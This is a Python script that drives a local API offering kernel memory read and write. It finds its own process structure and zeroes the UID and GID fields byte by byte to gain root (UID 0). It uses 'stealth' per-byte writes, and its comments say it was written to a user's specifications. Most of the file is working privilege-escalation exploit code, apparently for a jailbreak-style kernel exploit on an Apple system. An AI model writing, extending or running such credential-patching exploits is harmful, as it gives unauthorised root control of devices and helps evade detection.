#!/usr/bin/env python3
"""Byte patch test script.

Follows the user's methodology strictly: mask write, byte-wise writes with pauses,
alternate offsets, safety kread checks, timeouts, and logging.
"""
import sys
import time
import struct
import os
import requests

# Allow overriding the API base via environment variable `API_BASE`
API_BASE = os.environ.get("API_BASE", "http://127.0.0.1:8000")
TIMEOUT = 5.0


def panic_and_exit(msg="Kernel Panic Detected"):
    print(msg)
    sys.exit(1)


def api_get(path, params=None):
    url = API_BASE + path
    try:
        r = requests.get(url, params=params, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except requests.ConnectionError:
        print(" CRASHED")
        sys.exit(1)
    except requests.RequestException:
        panic_and_exit()


def api_post(path, json=None):
    url = API_BASE + path
    try:
        r = requests.post(url, json=json, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except requests.ConnectionError:
        print(" CRASHED")
        sys.exit(1)
    except requests.RequestException:
        panic_and_exit()


def kread(addr, size):
    # Use POST /api/v1/kread with JSON body as required by server
    print(f"Читаю адрес 0x{addr:016x} size={size}...")
    resp = api_post("/api/v1/kread", json={"addr": hex(addr), "size": size})
    # Server returns JSON; common shape: {"address":"0x...","value":"0x...","value_dec":"..."}
    if not isinstance(resp, dict):
        raise RuntimeError("kread: unexpected response format")
    if "value" in resp:
        val = resp.get("value")
        if isinstance(val, str) and val.startswith("0x"):
            hexs = val[2:]
            b = bytes.fromhex(hexs)
        else:
            # fallback if value is decimal string
            try:
                dec = int(resp.get("value_dec", "0"))
                b = struct.pack("<Q", dec)[:size]
            except Exception:
                raise RuntimeError("kread: cannot parse value field")
    elif "data" in resp:
        data = resp.get("data")
        if isinstance(data, str):
            hexs = data[2:] if data.startswith("0x") else data
            b = bytes.fromhex(hexs)
        elif isinstance(data, list):
            b = bytes(data)
        else:
            raise RuntimeError("kread: unsupported data format")
    else:
        raise RuntimeError("kread: missing value/data in response")
    if len(b) < size:
        b = b.ljust(size, b"\x00")
    return b[:size]


def kwrite(addr, data_bytes):
    # Attempt write via /api/v1/kwrite, but handle connection errors gracefully
    payload = {"addr": hex(addr), "data": data_bytes.hex()}
    url = API_BASE + "/api/v1/kwrite"
    print(f"KWRITE: addr=0x{addr:016x} len={len(data_bytes)}")
    try:
        r = requests.post(url, json=payload, timeout=TIMEOUT)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.RequestException:
        print("[CRITICAL]  CRASHED: Connection lost during kwrite. Helper process likely killed by kernel.")
        sys.exit(1)


def read_ourproc():
    print("Reading /api/v1/ds for ourproc...")
    resp = api_get("/api/v1/ds")
    ourproc = resp.get("ourproc")
    if ourproc is None:
        raise RuntimeError("/api/v1/ds did not contain 'ourproc'")
    return int(ourproc, 0) if isinstance(ourproc, str) else int(ourproc)


def read_ids():
    print("Reading /api/v1/ids for final verification...")
    resp = api_get("/api/v1/ids")
    return resp


def check_current_value(addr, expected):
    b = kread(addr, 8)
    cur = struct.unpack("<Q", b)[0]
    print(f"Current 64-bit value at 0x{addr:016x} = 0x{cur:016X}")
    return cur == expected, cur


# Mask write removed for stealth mode — we will perform per-byte stealth writes only.


def stealth_byte_writes(base_addr):
    # Perform stealth byte-wise writes starting at base_addr (UID location)
    print("Stealth mode: побайтовая запись начата")
    target = base_addr
    for off in range(4):
        addr = target + off
        print(f"Пишу байт 0 в адрес 0x{addr:016x} (смещение {off})...")
        try:
            kwrite(addr, b"\x00")
        except SystemExit:
            print("Сервер отключился во время записи; останавливаюсь.")
            return False
        print("Жду 0.5 сек...")
        time.sleep(0.5)
        print("Проверяю результат через /api/v1/ids...")
        ids = read_ids()
        uid = None
        if isinstance(ids, dict):
            uid = ids.get("uid")
        try:
            uid_val = int(uid)
        except Exception:
            try:
                uid_val = int(str(uid), 0)
            except Exception:
                print("Не удалось разобрать UID из /api/v1/ids; останавливаюсь.")
                return False
        print(f"Нашел UID={uid_val}")
        if uid_val == 0:
            print("Success: UID == 0 (patched)")
            return True
        # continue to next byte
    print("Stealth writes завершены, UID не стал 0")
    return False


def attempt_offsets(base_addr, original):
    # For stealth mode we will only try the primary UID offset
    uid_addr = base_addr + 0x30
    return stealth_byte_writes(uid_addr)


def forced_byte_patch(base_addr):
    # Force-write zero bytes to UID (base+0x30) and GID (base+0x34), per user request.
    targets = [base_addr + 0x30, base_addr + 0x34]
    for t in targets:
        print(f"Начиная принудительную побайтовую запись для адреса 0x{t:016x}...")
        for off in range(4):
            addr = t + off
            print(f"Пишу байт 0 в адрес 0x{addr:016x} (смещение {off})...")
            kwrite(addr, b"\x00")
            print("Жду 0.5 сек...")
            time.sleep(0.5)
            print("Проверяю /api/v1/ids...")
            ids = read_ids()
            uid = None
            if isinstance(ids, dict):
                uid = ids.get("uid")
            try:
                uid_val = int(uid)
            except Exception:
                try:
                    uid_val = int(str(uid), 0)
                except Exception:
                    print("Не удалось разобрать UID; продолжаю")
                    uid_val = None
            print(f"Текущий UID={uid_val}")
            if uid_val == 0:
                print(" OBTAINED")
                return True
    print("Принудительная запись завершена; UID не стал 0")
    return False


def main():
    print("Starting byte_patch_test.py (slow, careful patcher)")
    # Read ourproc
    ourproc = read_ourproc()
    print(f"ourproc = 0x{ourproc:016x}")
    base_addr = ourproc
    target_offset = 0x30
    target_addr = base_addr + target_offset

    # Expected initial value
    expected_initial = 0x000001F5000001F5

    print(f"Target addr for UID: 0x{target_addr:016x}")

    # User requested forced mode: ignore current value and perform forced byte writes
    print("Запуск принудительной побайтовой записи (Вариант B)...")
    worked = forced_byte_patch(base_addr)

    print("Final sync wait...")
    time.sleep(1.0)

    # Final verification via /api/v1/ids
    ids = read_ids()
    uid = None
    if isinstance(ids, dict):
        uid = ids.get("uid")
    if uid is None:
        print("Could not read UID from /api/v1/ids; unexpected response:", ids)
        sys.exit(1)
    try:
        uid_val = int(uid)
    except Exception:
        uid_val = int(str(uid), 0)

    if uid_val == 0:
        print("Success: UID == 0")
        sys.exit(0)
    elif uid_val == 501:
        print("Method did not work: UID == 501")
        sys.exit(2)
    else:
        print(f"UID is {uid_val}; method result uncertain.")
        sys.exit(3)


if __name__ == "__main__":
    main()
